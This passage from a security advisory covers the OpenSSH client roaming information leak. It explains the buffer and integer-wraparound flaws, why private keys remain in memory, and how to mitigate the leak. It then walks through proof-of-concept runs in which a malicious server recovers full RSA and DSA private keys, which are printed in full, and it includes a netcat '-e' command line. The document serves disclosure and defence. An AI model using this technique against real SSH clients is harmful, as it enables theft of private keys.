Guess the client's get_snd_buf_size() in order to precisely control   out_buf_size. OpenSSH < 6.0 accepts out_buf sizes in the range (0,4G),   and OpenSSH >= 6.0 accepts sizes in the range (0,2M]. Sizes smaller   than get_snd_buf_size() are attainable because roaming_reply() does   not protect "packet_get_int() + get_snd_buf_size()" against integer   wraparound. The proof-of-concept in this advisory attempts to derive   the client's get_snd_buf_size() from the get_recv_buf_size() sent by   the client to the server, and simply chooses a random out_buf_size.  - Advise the client's resend_bytes() that all "available" bytes (the   entire out_buf_size) are "needed" by the server, even if fewer bytes   were actually written by the client to the server (because the server   controls the "*offset" argument, and resend_bytes() does not protect   "needed = write_bytes - *offset" against integer wraparound).  Finally, a brief digression on a minor bug in resend_bytes(): on 64-bit systems, where "chunkend" is a 32-bit signed integer, but "out_buf" and "out_buf_size" are 64-bit variables, "out_buf + out_buf_size - chunkend" may point out-of-bounds, if chunkend is negative (if out_buf_size is in the [2G,4G) range). This negative chunkend is then converted to a 64-bit size_t greater than SSIZE_MAX when passed to atomicio(), and eventually returns EFAULT when passed to write() (at least on Linux and OpenBSD), thus avoiding an out-of-bounds read from the OpenSSH client's memory.  ------------------------------------------------------------------------ Private Key Disclosure ------------------------------------------------------------------------  We initially believed that this information leak in the OpenSSH client's roaming code would not allow a malicious SSH server to steal the client's private keys, because:  - the information leaked is not read from out-of-bounds memory, but from   a previously free()d chunk of memory that is recycled to malloc()ate   the client's roaming buffer out_buf;  - private keys are loaded from disk into memory and freed by key_free()   (old API, OpenSSH < 6.7) or sshkey_free() (new API, OpenSSH >= 6.7),   and both functions properly cleanse the private keys' memory with   OPENSSL_cleanse() or explicit_bzero();  - temporary copies of in-memory private keys are freed by buffer_free()   (old API) or sshbuf_free() (new API), and both functions attempt to   cleanse these copies with memset() or bzero().  However, we eventually identified three reasons why, in our experiments, we were able to partially or completely retrieve the OpenSSH client's private keys through this information leak (depending on the client's version, compiler, operating system, heap layout, and private keys):  1. If a private SSH key is loaded from disk into memory by fopen() (or fdopen()), fgets(), and fclose(), a partial or complete copy of this private key may remain uncleansed in memory. Indeed, these functions manage their own internal buffers, and whether these buffers are cleansed or not depends on the OpenSSH client's libc (stdio) implementation, but not on OpenSSH itself.  - In all vulnerable OpenSSH versions, SSH's main() function calls   load_public_identity_files(), which loads the client's public keys   with fopen(), fgets(), and fclose(). Unfortunately, the private keys   (without the ".pub" suffix) are loaded first and then discarded, but   nonetheless buffered in memory by the stdio functions.  - In OpenSSH versions <= 5.6, the load_identity_file() function (called   by the client's public-key authentication method) loads a private key   with fdopen() and PEM_read_PrivateKey(), an OpenSSL function that uses   fgets() and hence internal stdio buffering.  Internal stdio buffering is the most severe of the three problems discussed in this section, although GNU/Linux is not affected because the glibc mmap()s and munmap()s (and therefore cleanses) stdio buffers. BSD-based systems, on the other hand, are severely affected because they simply malloc()ate and free() stdio buffers. For interesting comments on this issue:  [https://www.securecoding.cert.org/confluence/display/c/MEM06-C.+Ensure+that+sensitive+data+is+not+written+out+to+disk](https://www.securecoding.cert.org/confluence/display/c/MEM06-C.%2BEnsure%2Bthat%2Bsensitive%2Bdata%2Bis%2Bnot%2Bwritten%2Bout%2Bto%2Bdisk)  2. In OpenSSH versions >= 5.9, the client's load_identity_file() function (called by the public-key authentication method) read()s a private key in 1024-byte chunks that are appended to a growing buffer (a realloc()ating buffer) with buffer_append() (old API) or sshbuf_put() (new API). Unfortunately, the repeated calls to realloc() may leave partial copies of the private key uncleansed in memory.  - In OpenSSH < 6.7 (old API), the initial size of such a growing buffer   is 4096 bytes: if a private-key file is larger than 4K, a partial copy   of this private key may remain uncleansed in memory (a 3K copy in a 4K   buffer). Fortunately, only the file of a very large RSA key (for   example, an 8192-bit RSA key) can exceed 4K.  - In OpenSSH >= 6.7 (new API), the initial size of a growing buffer is   256 bytes: if a private-key file is larger than 1K (the size passed to   read()), a partial copy of this private key may remain uncleansed in   memory (a 1K copy in a 1K buffer). For example, the file of a   default-sized 2048-bit RSA key exceeds 1K.  For more information on this issue:  [https://www.securecoding.cert.org/confluence/display/c/MEM03-C.+Clear+sensitive+information+stored+in+reusable+resources](https://www.securecoding.cert.org/confluence/display/c/MEM03-C.%2BClear%2Bsensitive%2Binformation%2Bstored%2Bin%2Breusable%2Bresources)  <https://cwe.mitre.org/data/definitions/244.html>  3. An OpenSSH growing-buffer that holds a private key is eventually freed by buffer_free() (old API) or sshbuf_free() (new API), and both functions attempt to cleanse the buffer with memset() or bzero() before they call free(). Unfortunately, an optimizing compiler may remove this memset() or bzero() call, because the buffer is written to, but never again read from (an optimization known as Dead Store Elimination).  OpenSSH 6.6 is the only version that is not affected, because it calls explicit_bzero() instead of memset() or bzero().  Dead Store Elimination is the least severe of the three problems explored in this section, because older GCC versions do not remove the memset() or bzero() call made by buffer_free() or sshbuf_free(). GCC 5 and Clang/LLVM do, however, remove it. For detailed discussions of this issue:  [https://www.securecoding.cert.org/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations](https://www.securecoding.cert.org/confluence/display/c/MSC06-C.%2BBeware%2Bof%2Bcompiler%2Boptimizations)  <https://cwe.mitre.org/data/definitions/14.html>  <https://sourceware.org/ml/libc-alpha/2014-12/threads.html#00506>  Finally, for these three reasons, passphrase-encrypted SSH keys are leaked in their encrypted form, but an attacker may attempt to crack the passphrase offline.  ------------------------------------------------------------------------ Mitigating Factors ------------------------------------------------------------------------  This information leak affects all OpenSSH clients >= 5.4, but its impact is slightly reduced by the following four reasons:  1. The vulnerable roaming code can be permanently disabled by adding the undocumented option "UseRoaming no" to the system-wide configuration file (usually /etc/ssh/ssh_config), or per-user configuration file (~/.ssh/config), or command-line (-o "UseRoaming no").  2. If an OpenSSH client is disconnected from an SSH server that offers roaming, it prints "[connection suspended, press return to resume]" on stderr, and waits for '\n' or '\r' on stdin (and not on the controlling terminal) before it reconnects to the server; advanced users may become suspicious and press Control-C or Control-Z instead, thus avoiding the information leak:  # "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 [connection suspended, press return to resume]^Z [1]+  Stopped                 /usr/bin/ssh -p 222 127.0.0.1  However, SSH commands that use the local stdin to transfer data to the remote server are bound to trigger this reconnection automatically (upon reading a '\n' or '\r' from stdin). Moreover, these non-interactive SSH commands (for example, backup scripts and cron jobs) commonly employ public-key authentication and are therefore perfect targets for this information leak:  $ ls -l /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.ls" [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][exiting]  $ tar -cf - /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.tar" tar: Removing leading `/' from member names [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][connection resumed] ... [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][exiting]  Similarly, the SCP client uses the SSH client's stdin and stdout to transfer data, and can be forced by a malicious SSH server to output a control record that ends in '\n' (an error message in server-to-client mode, or file permissions in client-to-server mode); this '\n' is then read from stdin by the fgetc() call in wait_for_roaming_reconnect(), and triggers an automatic reconnection that allows the information leak to be exploited without user interaction:  # env ROAMING="scp_mode sleep:1" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/scp -P 222 127.0.0.1:/etc/passwd /tmp $ [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][exiting]  $ /usr/bin/scp -P 222 /etc/passwd 127.0.0.1:/tmp [connection suspended, press return to resume][connection resumed] [connection suspended, press return to resume][exiting] lost connection  3. Although a man-in-the-middle attacker can reset the TCP connection between an OpenSSH client and an OpenSSH server (which does not support roaming), it cannot exploit the information leak without breaking server host authentication or integrity protection, because it needs to:  - first, append the "resume@appgate.com" algorithm name to the server's   initial key exchange message;  - second, in response to the client's "roaming@appgate.com" request,   change the server's reply from failure to success.  In conclusion, an attacker who wishes to exploit this information leak must convince its target OpenSSH client to connect to a malicious server (an unlikely scenario), or compromise a trusted server (a more likely scenario, for a determined attacker).  4. We discovered several non-security bugs, in specific versions and configurations of OpenSSH, that prevent the client's roaming code from reconnecting to the server and, as a result, prevent this information leak from being exploited. In the client, wait_for_roaming_reconnect() calls ssh_connect(), the same function that successfully established the first connection to the server; this function supports four different connection methods, but each method contains a bug and may fail to establish a second connection to the server:  - In OpenSSH >= 6.5 (released on January 30, 2014), the default   ssh_connect_direct() method (a simple TCP connection) is called by   wait_for_roaming_reconnect() with a NULL aitop argument, which makes   it impossible for the client to reconnect to the server:   418 static int  419 ssh_connect_direct(const char *host, struct addrinfo *aitop,  ...  424         int sock = -1, attempt;  425         char ntop[NI_MAXHOST], strport[NI_MAXSERV];  ...  430         for (attempt = 0; attempt < connection_attempts; attempt++) {  ...  440                 for (ai = aitop; ai; ai = ai->ai_next) {  ...  470                 }  471                 if (sock != -1)  472                         break;  /* Successful connection. */  473         }  474  475         /* Return failure if we didn't get a successful connection. */  476         if (sock == -1) {  477                 error("ssh: connect to host %s port %s: %s",  478                     host, strport, strerror(errno));  479                 return (-1);  480         }    Incidentally, this error() call displays stack memory from the   uninitialized strport[] array, a byproduct of the NULL aitop:  $ /usr/bin/ssh -V OpenSSH_6.8, LibreSSL 2.1  $ /usr/bin/ssh -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor [reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor [reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor [reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor  - The special ProxyCommand "-" communicates with the server through the   client's stdin and stdout, but these file descriptors are close()d by   packet_backup_state() at the beginning of wait_for_roaming_reconnect()   and are never reopened again, making it impossible for the client to   reconnect to the server. Moreover, the fgetc() that waits for '\n' or   '\r' on the closed stdin returns EOF and forces the client to exit():  $ /usr/bin/ssh -V OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013  $ /usr/bin/nc -e "/usr/bin/ssh -o ProxyCommand=- -p 222 127.0.0.1" 127.0.0.1 222 Pseudo-terminal will not be allocated because stdin is not a terminal. user@127.0.0.1's password: [connection suspended, press return to resume][exiting]  - The method ssh_proxy_fdpass_connect() fork()s a ProxyCommand that   passes a connected file descriptor back to the client, but it calls   fatal() while reconnecting to the server, because waitpid() returns   ECHILD; indeed, the SIGCHLD handler (installed by SSH's main() after   the first successful connection to the server) calls waitpid() before   ssh_proxy_fdpass_connect() does:  1782 static void 1783 main_sigchld_handler(int sig) 1784 { .... 1789         while ((pid = waitpid(-1, &status, WNOHANG)) > 0 || 1790             (pid < 0 && errno == EINTR)) 1791                 ; 1792 1793         signal(sig, main_sigchld_handler); .... 1795 }   101 static int  102 ssh_proxy_fdpass_connect(const char *host, u_short port,  103     const char *proxy_command)  104 {  ...  121         /* Fork and execute the proxy command. */  122         if ((pid = fork()) == 0) {  ...  157         }  158         /* Parent. */  ...  167         while (waitpid(pid, NULL, 0) == -1)  168                 if (errno != EINTR)  169                         fatal("Couldn't wait for child: %s", strerror(errno));  $ /usr/bin/ssh -V OpenSSH_6.6.1p1, OpenSSL 1.0.1p-freebsd 9 Jul 2015  $ /usr/bin/ssh -o ProxyUseFdpass=yes -o ProxyCommand="/usr/bin/nc -F %h %p" -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume]Couldn't wait for child: No child processes  - The method ssh_proxy_connect() fork()s a standard ProxyCommand that   connects the client to the server, but if a disconnection occurs, and   the SIGCHLD of the terminated ProxyCommand is caught while fgetc() is   waiting for a '\n' or '\r' on stdin, EOF is returned (the underlying   read() returns EINTR) and the client exit()s before it can reconnect   to the server:  $ /usr/bin/ssh -V OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014  $ /usr/bin/ssh -o ProxyCommand="/bin/nc %h %p" -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][exiting]    This behavior is intriguing, because (at least on Linux and BSD) the   signal() call that installed the main_sigchld_handler() is supposed to   be equivalent to a sigaction() call with SA_RESTART. However, portable   versions of OpenSSH override signal() with mysignal(), a function that   calls sigaction() without SA_RESTART.    This last mitigating factor is actually a race-condition bug that   depends on the ProxyCommand itself: for example, the client never   fails to reconnect to the server when using Socat as a ProxyCommand,   but fails occasionally when using Netcat.  ------------------------------------------------------------------------ Private Key Disclosure example: FreeBSD 10.0, 2048-bit RSA key ------------------------------------------------------------------------  $ head -n 1 /etc/motd FreeBSD 10.0-RELEASE (GENERIC) #0 r260789: Thu Jan 16 22:34:59 UTC 2014  $ /usr/bin/ssh -V OpenSSH_6.4p1, OpenSSL 1.0.1e-freebsd 11 Feb 2013  $ cat ~/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0 9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+ eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme vOzVcOC+Y/wkpJET3ZEhNrPFZ0a0ab5JLxRwQk9mFYuGpOO8H5av5Nm8/PRB7JHi /rnxmfPGIWJX2dG9AInmVFGWBQCNUxwwQzpz9/VnngsjMWoYSayU534SrE36HFtE K+nsuxA+vtalgniToudAr6H5AoGADIkZeAPAmQQIrJZCylY00dW+9G/0mbZYJdBr +7TZERv+bZXaq3UPQsUmMJWyJsNbzq3FBIx4Xt0/QApLAUsa+l26qLb8V+yDCZ+n UxvMSgpRinkMFK/Je0L+IMwua00w7jSmEcMq0LJckwtdjHqo9rdWkvavZb13Vxh7 qsm+NEcCgYEA3KEbTiOU8Ynhv96JD6jDwnSq5YtuhmQnDuHPxojgxSafJOuISI11 1+xJgEALo8QBQT441QSLdPL1ZNpxoBVAJ2a23OJ/Sp8dXCKHjBK/kSdW3U8SJPjV pmvQ0UqnUpUj0h4CVxUco4C906qZSO5Cemu6g6smXch1BCUnY0TcOgs= -----END RSA PRIVATE KEY-----  # env ROAMING="client_out_buf_size:1280" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][connection resumed]  # cat /tmp/roaming-97ed9f59/infoleak MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0 9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+ eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme  ------------------------------------------------------------------------ Private Key Disclosure example: FreeBSD 9.2, 1024-bit DSA key ------------------------------------------------------------------------  $ head -n 1 /etc/motd FreeBSD 9.2-RELEASE (GENERIC) #0 r255898: Fri Sep 27 03:52:52 UTC 2013  $ /usr/bin/ssh -V OpenSSH_6.2p2, OpenSSL 0.9.8y 5 Feb 2013  $ cat ~/.ssh/id_dsa -----BEGIN DSA PRIVATE KEY----- MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe 4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY 8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4 cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+ iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh PHatTfiy5p82Q8+TD60= -----END DSA PRIVATE KEY-----  # env ROAMING="client_out_buf_size:768" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 [connection suspended, press return to resume][connection resumed]  # cat /tmp/roaming-9448bb7f/infoleak MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe 4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY 8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4 cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+ iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To ...  # env ROAMING="client_out_buf_size:1024" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 [connection suspended, press return to resume][connection resumed]  # cat /tmp/roaming-279f5e2b/infoleak ... iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh PHatTfiy5p82Q8+TD60= ...  ------------------------------------------------------------------------ Private Key Disclosure example: OpenBSD 5.4, 2048-bit RSA key ------------------------------------------------------------------------  $ head -n 1 /etc/motd OpenBSD 5.4 (GENERIC) #37: Tue Jul 30 15:24:05 MDT 2013  $ /usr/bin/ssh -V OpenSSH_6.3, OpenSSL 1.0.1c 10 May 2012  $ cat ~/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL 9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175 ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G +umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95 n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt 8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5 cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb 3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1 /tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0= -----END RSA PRIVATE KEY-----  # env ROAMING="client_out_buf_size:2048" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][connection resumed]  # cat /tmp/roaming-35ee7ab0/infoleak MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL 9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175 ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G +umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95 n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt 8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5 cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb 3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1 /tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS  $ /usr/bin/ssh -p 222 127.0.0.1 user@127.0.0.1's password: [connection suspended, press return to resume][connection resumed] # cat /tmp/roaming-6cb31d82/infoleak ... uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1 /tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=  ------------------------------------------------------------------------ Private Key Disclosure example: OpenBSD 